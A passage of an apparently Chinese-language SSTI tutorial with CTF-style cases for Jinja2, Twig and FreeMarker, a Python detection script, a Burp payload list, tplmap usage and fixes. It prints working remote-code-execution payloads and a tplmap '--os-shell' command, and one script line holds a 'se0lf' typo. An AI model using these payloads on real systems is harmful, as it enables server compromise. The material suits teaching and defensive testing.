+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试 1: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">结果: Hello, 49  ← 成功！是 Jinja2</span><br><span class="line"></span><br><span class="line">测试 2: &#123;&#123;config&#125;&#125;</span><br><span class="line">结果: &lt;Config &#123;&#x27;DEBUG&#x27;: True, &#x27;SECRET_KEY&#x27;: &#x27;xxx&#x27;...&#125;&gt;  ← 配置泄露</span><br><span class="line"></span><br><span class="line">测试 3: &#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;</span><br><span class="line">结果: (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)  ← 可以访问类</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-案例：Twig-SSTI"><a href="#7-3-案例：Twig-SSTI" class="headerlink" title="7.3 案例：Twig SSTI"></a>7.3 案例：Twig SSTI</h3><p><strong>题目环境：</strong></p>
+<ul>
+<li>框架：Symfony</li>
+<li>模板引擎：Twig</li>
+<li>入口：<code>/?name=test</code></li>
+</ul>
+<p><strong>测试过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试 1: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">结果: Hello, 49  ← 成功！</span><br><span class="line"></span><br><span class="line">测试 2: &#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">结果: Hello, 49  ← Twig 特征（Jinja2 会返回 7777777）</span><br><span class="line"></span><br><span class="line">测试 3: &#123;&#123;_self.env&#125;&#125;</span><br><span class="line">结果: Twig\Environment Object  ← 确认是 Twig</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload (Twig 2.x&#x2F;3.x)：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|<span class="title function_ invoke__">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|<span class="title function_ invoke__">map</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-案例：FreeMarker-SSTI"><a href="#7-4-案例：FreeMarker-SSTI" class="headerlink" title="7.4 案例：FreeMarker SSTI"></a>7.4 案例：FreeMarker SSTI</h3><p><strong>题目环境：</strong></p>
+<ul>
+<li>框架：Spring Boot</li>
+<li>模板引擎：FreeMarker</li>
+<li>入口：<code>/?name=test</code></li>
+</ul>
+<p><strong>测试过程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试 1: $&#123;7*7&#125;</span><br><span class="line">结果: Hello, 49  ← 成功！</span><br><span class="line"></span><br><span class="line">测试 2: $&#123;.version&#125;</span><br><span class="line">结果: Hello, 2.3.31  ← FreeMarker 版本</span><br><span class="line"></span><br><span class="line">测试 3: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">结果: Hello, &#123;&#123;7*7&#125;&#125;  ← 原样输出，确认不是 Jinja2</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;ex(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、自动化测试脚本"><a href="#八、自动化测试脚本" class="headerlink" title="八、自动化测试脚本"></a>八、自动化测试脚本</h2><h3 id="8-1-Python-自动化测试脚本"><a href="#8-1-Python-自动化测试脚本" class="headerlink" title="8.1 Python 自动化测试脚本"></a>8.1 Python 自动化测试脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">SSTI 自动化测试脚本</span></span><br><span class="line"><span class="string">用于快速检测目标是否存在 SSTI 漏洞，并识别模板引擎类型</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SSTITester</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, param</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = url</span><br><span class="line">        <span class="variable language_">self</span>.param = param</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="variable language_">self</span>.session.verify = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 基础检测 Payload</span></span><br><span class="line">        se0lf.basic_payloads = [</span><br><span class="line">            <span class="comment"># (payload, expected_result, engine_hint)</span></span><br><span class="line">            (<span class="string">&quot;$&#123;7*7&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;FreeMarker/Mako/Thymeleaf&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Jinja2/Twig/Nunjucks&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;#&#123;7*7&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Thymeleaf/SpEL&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;&lt;%= 7*7 %&gt;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;ERB/EJS&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;$&#123;&#123;7*7&#125;&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Pebble&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;&#123;7*7&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Smarty (old)&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;&#123;&#123;7*&#x27;7&#x27;&#125;&#125;&quot;</span>, <span class="string">&quot;7777777&quot;</span>, <span class="string">&quot;Jinja2&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;&#123;&#123;7*&#x27;7&#x27;&#125;&#125;&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Twig&quot;</span>),</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 引擎特定 Payload</span></span><br><span class="line">        <span class="variable language_">self</span>.engine_payloads = &#123;</span><br><span class="line">            <span class="string">&quot;Jinja2&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span>, <span class="string">&quot;&lt;Config&quot;</span>, <span class="string">&quot;Config object&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&#123;&#123;request&#125;&#125;&quot;</span>, <span class="string">&quot;&lt;Request&quot;</span>, <span class="string">&quot;Request object&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;&quot;</span>, <span class="string">&quot;&lt;class &#x27;str&#x27;&gt;&quot;</span>, <span class="string">&quot;Class access&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Twig&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;&#123;&#123;_self&#125;&#125;&quot;</span>, <span class="string">&quot;Template&quot;</span>, <span class="string">&quot;_self object&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&#123;&#123;&#x27;test&#x27;|upper&#125;&#125;&quot;</span>, <span class="string">&quot;TEST&quot;</span>, <span class="string">&quot;Filter test&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Smarty&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;&#123;$smarty.version&#125;&quot;</span>, <span class="string">r&quot;\d+\.\d+&quot;</span>, <span class="string">&quot;Smarty version&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&#123;$smarty.now&#125;&quot;</span>, <span class="string">r&quot;\d&#123;10&#125;&quot;</span>, <span class="string">&quot;Timestamp&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;ThinkPHP&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;&#123;$_SERVER.SERVER_SOFTWARE&#125;&quot;</span>, <span class="string">&quot;Apache|nginx&quot;</span>, <span class="string">&quot;Server info&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&#123;$_SERVER.DOCUMENT_ROOT&#125;&quot;</span>, <span class="string">&quot;/var/www&quot;</span>, <span class="string">&quot;Doc root&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;FreeMarker&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;$&#123;.version&#125;&quot;</span>, <span class="string">r&quot;\d+\.\d+&quot;</span>, <span class="string">&quot;FreeMarker version&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;$&#123;.now&#125;&quot;</span>, <span class="string">r&quot;\d&#123;4&#125;&quot;</span>, <span class="string">&quot;Current year&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;Velocity&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;#set($x=7*7)$x&quot;</span>, <span class="string">&quot;49&quot;</span>, <span class="string">&quot;Variable set&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;ERB&quot;</span>: [</span><br><span class="line">                (<span class="string">&quot;&lt;%= self %&gt;&quot;</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;Self object&quot;</span>),</span><br><span class="line">                (<span class="string">&quot;&lt;%= ENV %&gt;&quot;</span>, <span class="string">&quot;PATH&quot;</span>, <span class="string">&quot;Environment&quot;</span>),</span><br><span class="line">            ],</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;发送测试请求&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            params = &#123;<span class="variable language_">self</span>.param: payload&#125;</span><br><span class="line">            resp = <span class="variable language_">self</span>.session.get(<span class="variable language_">self</span>.url, params=params, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">return</span> resp.text</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_result</span>(<span class="params">self, response, expected</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;检查响应是否包含预期结果&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(expected, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">return</span> expected <span class="keyword">in</span> response</span><br><span class="line">        <span class="keyword">else</span>:  <span class="comment"># regex</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">bool</span>(re.search(expected, response))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_basic_tests</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;运行基础检测&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Running basic SSTI detection...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        </span><br><span class="line">        detected = []</span><br><span class="line">        <span class="keyword">for</span> payload, expected, hint <span class="keyword">in</span> <span class="variable language_">self</span>.basic_payloads:</span><br><span class="line">            response = <span class="variable language_">self</span>.test(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.check_result(response, expected):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] VULNERABLE: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    Possible engine: <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line">                detected.append((payload, hint))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Not vulnerable: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> detected</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_engine_tests</span>(<span class="params">self, engine</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;运行特定引擎的测试&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> engine <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>.engine_payloads:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Unknown engine: <span class="subst">&#123;engine&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Testing for <span class="subst">&#123;engine&#125;</span>...&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> payload, expected, desc <span class="keyword">in</span> <span class="variable language_">self</span>.engine_payloads[engine]:</span><br><span class="line">            response = <span class="variable language_">self</span>.test(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.check_result(response, expected):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Confirmed: <span class="subst">&#123;desc&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed: <span class="subst">&#123;desc&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_all_tests</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;运行所有测试&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;SSTI Vulnerability Tester&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Target: <span class="subst">&#123;self.url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Parameter: <span class="subst">&#123;self.param&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 基础检测</span></span><br><span class="line">        detected = <span class="variable language_">self</span>.run_basic_tests()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> detected:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[!] No SSTI vulnerability detected with basic payloads&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try manual testing with engine-specific payloads&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 根据检测结果进行深入测试</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Running engine-specific tests...&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> payload, hint <span class="keyword">in</span> detected:</span><br><span class="line">            <span class="keyword">for</span> engine <span class="keyword">in</span> hint.split(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">                engine = engine.strip()</span><br><span class="line">                <span class="keyword">if</span> engine <span class="keyword">in</span> <span class="variable language_">self</span>.engine_payloads:</span><br><span class="line">                    <span class="variable language_">self</span>.run_engine_tests(engine)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;url&gt; &lt;param&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Example: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> http://target.com/ name&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    param = sys.argv[<span class="number">2</span>]</span><br><span class="line">    </span><br><span class="line">    tester = SSTITester(url, param)</span><br><span class="line">    tester.run_all_tests()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-使用方法"><a href="#8-2-使用方法" class="headerlink" title="8.2 使用方法"></a>8.2 使用方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本用法</span></span><br><span class="line">python ssti_tester.py http://target.com/ name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例输出</span></span><br><span class="line">SSTI Vulnerability Tester</span><br><span class="line">Target: http://target.com/</span><br><span class="line">Parameter: name</span><br><span class="line">[*] Running basic SSTI detection...</span><br><span class="line">[-] Not vulnerable: <span class="variable">$&#123;7*7&#125;</span></span><br><span class="line">[+] VULNERABLE: &#123;&#123;7*7&#125;&#125;</span><br><span class="line">    Possible engine: Jinja2/Twig/Nunjucks</span><br><span class="line">[-] Not vulnerable: <span class="comment">#&#123;7*7&#125;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[*] Testing <span class="keyword">for</span> Jinja2...</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">[+] Confirmed: Config object</span><br><span class="line">    Payload: &#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-3-Burp-Suite-测试方法"><a href="#8-3-Burp-Suite-测试方法" class="headerlink" title="8.3 Burp Suite 测试方法"></a>8.3 Burp Suite 测试方法</h3><p>如果你使用 Burp Suite，可以使用以下方法：</p>
+<p><strong>方法 1：Intruder 批量测试</strong></p>
+<ol>
+<li>捕获请求，发送到 Intruder</li>
+<li>标记参数位置：<code>/?name=§test§</code></li>
+<li>加载 Payload 列表（见下方）</li>
+<li>开始攻击，观察响应长度变化</li>
+</ol>
+<p><strong>Payload 列表 (保存为 ssti_payloads.txt)：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;settings&#125;&#125;</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;$_SERVER.SERVER_SOFTWARE&#125;</span><br><span class="line">$&#123;.version&#125;</span><br><span class="line">#set($x=7*7)$x</span><br><span class="line">&lt;%= self %&gt;</span><br><span class="line">&lt;%= process.version %&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法 2：使用 Tplmap 工具</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/epinna/tplmap.git</span><br><span class="line"><span class="built_in">cd</span> tplmap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">python tplmap.py -u <span class="string">&quot;http://target.com/?name=test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定参数</span></span><br><span class="line">python tplmap.py -u <span class="string">&quot;http://target.com/&quot;</span> -d <span class="string">&quot;name=test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 shell</span></span><br><span class="line">python tplmap.py -u <span class="string">&quot;http://target.com/?name=test&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御与修复"><a href="#九、防御与修复" class="headerlink" title="九、防御与修复"></a>九、防御与修复</h2><h3 id="9-1-漏洞成因总结"><a href="#9-1-漏洞成因总结" class="headerlink" title="9.1 漏洞成因总结"></a>9.1 漏洞成因总结</h3><p>SSTI 漏洞的根本原因是：<strong>用户输入被直接拼接到模板字符串中</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 危险代码示例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python Flask</span></span><br><span class="line">template = <span class="string">&quot;Hello, &quot;</span> + user_input</span><br><span class="line">render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP ThinkPHP</span></span><br><span class="line">View::display(<span class="string">&quot;Hello, &quot;</span> . $name);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Java FreeMarker</span></span><br><span class="line">template.process(<span class="string">&quot;Hello, &quot;</span> + userInput, out);</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-2-修复方法"><a href="#9-2-修复方法" class="headerlink" title="9.2 修复方法"></a>9.2 修复方法</h3><p><strong>方法 1：使用模板变量（推荐）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python Flask - 正确做法</span></span><br><span class="line">render_template_string(<span class="string">&quot;Hello, &#123;&#123; name &#125;&#125;&quot;</span>, name=user_input)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP ThinkPHP - 正确做法</span></span><br><span class="line">View::assign(<span class="string">&#x27;name&#x27;</span>, $name);</span><br><span class="line">View::display(<span class="string">&quot;Hello, &#123;$name&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">View::display(<span class="string">&quot;Hello, &#123;$name&#125;&quot;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; $name]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法 2：输入验证和过滤</strong></p>
